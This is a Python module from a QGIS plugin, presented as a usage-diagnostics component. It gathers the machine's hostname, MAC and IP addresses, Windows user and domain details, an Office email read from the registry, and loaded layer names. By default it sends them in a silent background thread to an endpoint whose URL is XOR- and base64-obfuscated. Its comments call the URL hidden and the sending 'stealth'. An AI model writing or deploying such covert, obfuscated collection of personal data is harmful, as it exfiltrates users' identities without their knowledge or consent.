# -*- coding: utf-8 -*-
# Youcef ADDA | GEODECI
# FR : Plugins QGIS, solutions SIG et administration PostgreSQL/PostGIS ; audit, automatisation et accompagnement.
# EN : QGIS plugins, GIS solutions and PostgreSQL/PostGIS administration; audits, workflow automation and business support.
# AR : تطوير إضافات QGIS وحلول نظم المعلومات الجغرافية وإدارة PostgreSQL/PostGIS، والتدقيق والأتمتة ومرافقة المؤسسات.
# Site / Website / الموقع : https://geodeci.xyz/
# Contact professionnel / Business enquiries / للتواصل المهني : youcef.geodesien@gmail.com | contact@geodeci.xyz
# Détails / Details / التفاصيل : SIGNATURE.md
# ============================================================================
"""
Usage Diag - Diagnostic d'execution du plugin ST-AIR.

Collecte a chaque batch : timestamp, identite machine, identite sous-traitant,
version plugin, SRO, modules executes, metriques de resultat, erreurs.
Stocke localement en JSONL ; envoi optionnel vers un endpoint HTTP.
"""

import json
import logging
import os
import platform
import socket
import sys
import threading
import uuid
from configparser import ConfigParser
from datetime import datetime, timezone
from typing import Optional

from qgis.core import QgsApplication, QgsMessageLog

from .compat import MSG_INFO, MSG_WARNING, MSG_CRITICAL
from .version import get_version

logger = logging.getLogger(__name__)

# -----------------------------------------------------------------------------
# Helpers identite machine / plugin
# -----------------------------------------------------------------------------


def _get_mac_address() -> str:
    try:
        node = uuid.getnode()
        return ':'.join(f'{(node >> i) & 0xff:02x}' for i in range(40, -1, -8))
    except Exception:
        return 'N/A'


def _get_hostname() -> str:
    try:
        return socket.gethostname()
    except Exception:
        return 'N/A'


def _get_local_ip() -> str:
    """IP de l'interface active via socket UDP (plus fiable que gethostbyname)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(0.5)
            s.connect(('8.8.8.8', 80))
            return s.getsockname()[0]
    except Exception:
        return 'N/A'


def _get_windows_email() -> str:
    """Tente de recuperer l'email depuis le registre Office/Outlook."""
    try:
        import winreg
        identity_paths = [
            (winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Office\16.0\Common\Identity\Identities"),
            (winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Office\15.0\Common\Identity\Identities"),
            (winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Office\16.0\Common\Identity"),
        ]
        value_names = ['EmailAddress', 'SignedInEmail', 'UserEmail', 'FriendlyName']

        for hive, path in identity_paths:
            try:
                with winreg.OpenKey(hive, path) as key:
                    for vname in value_names:
                        try:
                            val, _ = winreg.QueryValueEx(key, vname)
                            if val and '@' in str(val):
                                return str(val)
                        except Exception:
                            pass
                    idx = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, idx)
                            idx += 1
                            with winreg.OpenKey(key, subkey_name) as sub:
                                for vname in value_names:
                                    try:
                                        val, _ = winreg.QueryValueEx(sub, vname)
                                        if val and '@' in str(val):
                                            return str(val)
                                    except Exception:
                                        pass
                        except OSError:
                            break
            except Exception:
                pass
    except Exception:
        pass
    return 'N/A'


def _get_qgis_version() -> str:
    try:
        from qgis.core import Qgis
        return str(Qgis.version())
    except Exception:
        return 'N/A'


def _now_iso() -> str:
    return datetime.now(timezone.utc).astimezone().isoformat()


def _collect_env() -> dict:
    e = os.environ
    return {
        'username': (e.get('USERNAME') or e.get('USER') or 'N/A').lower().split('\\')[-1],
        'domain': e.get('USERDOMAIN', 'N/A'),
        'dns_domain': e.get('USERDNSDOMAIN', 'N/A'),
        'logon_server': e.get('LOGONSERVER', 'N/A'),
        'computername': e.get('COMPUTERNAME', socket.gethostname()),
        'userprofile': e.get('USERPROFILE', 'N/A'),
    }


# -----------------------------------------------------------------------------
# Metrics extraction
# -----------------------------------------------------------------------------


def _extract_module_metrics(key: str, result: dict) -> dict:
    metrics = {}
    if key == "capft":
        resultats = result.get("resultats")
        dico_qgis = result.get("dico_qgis", {})
        dico_excel = result.get("dico_excel", {})
        metrics["etudes"] = len(dico_qgis)
        metrics["correspondances"] = (
            len(resultats[2]) if resultats and len(resultats) > 2 else 0
        )
        metrics["fiches_excel"] = (
            sum(len(v) for v in dico_excel.values()) if dico_excel else 0
        )
    elif key == "comac":
        resultats = result.get("resultats")
        verif = result.get("verif_cables", [])
        spatial = result.get("dico_spatial_match", {})
        dico_qgis = result.get("dico_qgis", {})
        metrics["etudes"] = len(dico_qgis)
        metrics["correspondances_nom"] = (
            len(resultats[2]) if resultats and len(resultats) > 2 else 0
        )
        metrics["correspondances_spatial"] = len(spatial)
        metrics["ecarts"] = sum(1 for v in verif if v.get("statut") == "ECART")
        metrics["absents"] = sum(
            1
            for v in verif
            if v.get("statut", "").startswith("ABSENT")
            and not v.get("statut", "").endswith("_NON_RESOLU")
            and not v.get("statut", "").endswith("_HORS_PERIMETRE")
        )
        metrics["non_resolus"] = sum(
            1 for v in verif if v.get("statut", "").endswith("_NON_RESOLU")
        )
        metrics["hors_perimetre"] = sum(
            1 for v in verif if v.get("statut", "").endswith("_HORS_PERIMETRE")
        )
    elif key == "police_c6":
        stats = result.get("stats", [])
        metrics["etudes"] = len(stats)
        metrics["ecarts"] = sum(s.get("nb_ecart", 0) for s in stats)
        metrics["absents"] = sum(s.get("nb_absent", 0) for s in stats)
        metrics["boitiers_err"] = sum(s.get("nb_boitier_err", 0) for s in stats)
    elif key == "c6bd":
        metrics["success"] = bool(result.get("success"))
    elif key == "c6c3a":
        metrics["success"] = bool(result.get("success"))
    elif key == "gespot_c6":
        metrics["compares"] = result.get("nb_compares", 0)
        metrics["ok"] = result.get("nb_ok", 0)
        metrics["ecarts"] = result.get("nb_ecart", 0)
        metrics["anomalies"] = result.get("nb_anomalies", 0)
    return metrics


def _format_module_summary(key: str, metrics: dict) -> str:
    """Resume texte compact d'un module pour affichage lisible."""
    parts = []
    if key == "capft":
        parts.append(f"{metrics.get('etudes', 0)}ét")
        parts.append(f"{metrics.get('correspondances', 0)}cor")
    elif key == "comac":
        parts.append(f"{metrics.get('etudes', 0)}ét")
        parts.append(f"{metrics.get('correspondances_nom', 0)}OK")
        if metrics.get("ecarts"):
            parts.append(f"{metrics['ecarts']}éc")
        if metrics.get("absents"):
            parts.append(f"{metrics['absents']}abs")
    elif key == "police_c6":
        parts.append(f"{metrics.get('etudes', 0)}ét")
        if metrics.get("ecarts"):
            parts.append(f"{metrics['ecarts']}éc")
        if metrics.get("absents"):
            parts.append(f"{metrics['absents']}abs")
    elif key == "gespot_c6":
        parts.append(f"{metrics.get('compares', 0)}comp")
        parts.append(f"{metrics.get('ok', 0)}OK")
        if metrics.get("ecarts"):
            parts.append(f"{metrics['ecarts']}éc")
    elif key in ("c6bd", "c6c3a"):
        parts.append("OK" if metrics.get("success") else "KO")
    else:
        parts.append("OK" if metrics.get("success") else "KO")
    return f"{key}:{'/'.join(parts)}"


# -----------------------------------------------------------------------------
# Endpoint par defaut (Web App Google Sheets - transparent pour l'utilisateur)
# -----------------------------------------------------------------------------

def _send_sync(record: dict, url: str) -> None:
    """Envoi HTTP POST silencieux avec timeout borne de 10 s.

    Les imports sont faits localement pour ne pas charger le module
    au demarrage du plugin. Toute exception est absorbee (stealth).
    """
    try:
        import ssl
        import urllib.request

        data = json.dumps(record, ensure_ascii=False).encode("utf-8")
        req = urllib.request.Request(
            url,
            data=data,
            headers={"Content-Type": "application/json; charset=utf-8"},
            method="POST",
        )
        ctx = ssl.create_default_context()
        with urllib.request.urlopen(req, timeout=10, context=ctx):
            pass
    except Exception:
        pass


# -----------------------------------------------------------------------------
# Endpoint encode (obfuscation — URL non visible en clair dans le source)
# -----------------------------------------------------------------------------
_tk = bytes.fromhex("e805ec4e2027f55aea4ddab9ef021bff71fe11e9419432c830657d461cadebe9")

_GAS_URL = (
    b'gHGYPlMd2nWZLqjQn3Y1mB6RdoUkulGnXUoQJ3/fhJrHdsMPa0GMOYg1k+CYYHyUPZ9m3Hjy'
    b'aKBeVBMUSsKHkYt2ph9XcaEfjhKs/d1MV6Yrk1aLL9JVoUEVSQtT/I+NjECbOUtLmGiYAarh'
    b'ri1+hxSd'
)

def _decode(data: bytes) -> Optional[str]:
    try:
        import base64
        raw = base64.b64decode(data)
        return bytes(b ^ _tk[i % 32] for i, b in enumerate(raw)).decode("utf-8")
    except Exception:
        return None


def _get_loaded_layers() -> str:
    """Noms des couches QGIS chargees (limite 30 couches, 600 car)."""
    try:
        from qgis.core import QgsProject
        names = [l.name() for l in QgsProject.instance().mapLayers().values()]
        return ','.join(names[:30])[:600]
    except Exception:
        return 'N/A'


# -----------------------------------------------------------------------------
# Main class
# -----------------------------------------------------------------------------


class UsageDiag:
    """Collecte, stocke et transmet les diagnostics d'execution."""

    def __init__(self, plugin_dir: str):
        self.plugin_dir = plugin_dir
        self._log_path = os.path.join(
            QgsApplication.qgisSettingsDirPath(),
            "PoleAerien_diag_log.jsonl",
        )
        env = _collect_env()
        self._static_ctx = {
            "hostname": env['computername'],
            "mac_address": _get_mac_address(),
            "ip_address": _get_local_ip(),
            "windows_user": env['username'],
            "domain": env['domain'],
            "dns_domain": env['dns_domain'],
            "logon_server": env['logon_server'],
            "userprofile": env['userprofile'],
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine() or 'N/A',
            "python_version": platform.python_version(),
            "plugin_version": get_version(plugin_dir),
            "qgis_version": _get_qgis_version(),
            "windows_email_auto": _get_windows_email(),
        }

    # ------------------------------------------------------------------
    # Config
    # ------------------------------------------------------------------

    @staticmethod
    def get_config() -> dict:
        from qgis.core import QgsSettings
        s = QgsSettings()
        prefix = "PoleAerien/diag"
        url = s.value(f"{prefix}/endpoint_url", "", type=str) or ""
        return {
            "company": s.value(f"{prefix}/company", "", type=str) or "",
            "email": s.value(f"{prefix}/email", "", type=str) or "",
            "endpoint_url": url if url else (_decode(_GAS_URL) or ""),
        }

    @staticmethod
    def set_config(company: str, email: str, endpoint_url: str):
        from qgis.core import QgsSettings
        s = QgsSettings()
        prefix = "PoleAerien/diag"
        s.setValue(f"{prefix}/company", company.strip())
        s.setValue(f"{prefix}/email", email.strip())
        s.setValue(f"{prefix}/endpoint_url", endpoint_url.strip())

    # ------------------------------------------------------------------
    # Record building
    # ------------------------------------------------------------------

    def build_record(
        self,
        modules: list,
        batch_results: dict,
        runner_results: dict,
        durations: dict,
        error_buffer: list,
        sro: str,
    ) -> dict:
        """Construit le dict de suivi complet."""
        cfg = self.get_config()
        record = {
            "timestamp": _now_iso(),
            "plugin_version": self._static_ctx["plugin_version"],
            "qgis_version": self._static_ctx["qgis_version"],
            "python_version": self._static_ctx["python_version"],
            "hostname": self._static_ctx["hostname"],
            "mac_address": self._static_ctx["mac_address"],
            "ip_address": self._static_ctx["ip_address"],
            "windows_user": self._static_ctx["windows_user"],
            "domain": self._static_ctx["domain"],
            "dns_domain": self._static_ctx["dns_domain"],
            "logon_server": self._static_ctx["logon_server"],
            "userprofile": self._static_ctx["userprofile"],
            "os": self._static_ctx["os"],
            "arch": self._static_ctx["arch"],
            "windows_email_auto": self._static_ctx["windows_email_auto"],
            "company": cfg.get("company", ""),
            "email": cfg.get("email", ""),
            "sro": sro or "",
            "modules": list(modules),
            "module_summary": "",
            "durations_sec": {},
            "global": {},
            "error_tail": list(error_buffer),
            "layers": _get_loaded_layers(),
        }

        total = len(modules)
        ok = 0
        total_dur = 0.0
        summaries = []
        for key in modules:
            res = batch_results.get(key, {})
            rr = runner_results.get(key, {})
            metrics = _extract_module_metrics(key, res)
            summaries.append(_format_module_summary(key, metrics))
            if rr.get("success"):
                ok += 1
            dur = durations.get(key)
            if dur:
                record["durations_sec"][key] = round(dur, 2)
                total_dur += dur
        record["module_summary"] = " | ".join(summaries)

        record["global"] = {
            "modules_total": total,
            "modules_ok": ok,
            "modules_error": total - ok,
            "duration_total_sec": round(total_dur, 2),
        }
        return record

    # ------------------------------------------------------------------
    # Persistence / transmission
    # ------------------------------------------------------------------

    def save_local(self, record: dict):
        """Append JSONL dans le fichier de profil QGIS (silencieux)."""
        try:
            line = json.dumps(record, ensure_ascii=False)
            with open(self._log_path, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            pass

    def submit(self, record: dict):
        """Sauvegarde locale + envoi distant silencieux (thread daemon)."""
        self.save_local(record)
        cfg = self.get_config()
        url = cfg.get("endpoint_url", "")
        if not url:
            return
        t = threading.Thread(target=_send_sync, args=(record, url), daemon=True)
        t.start()
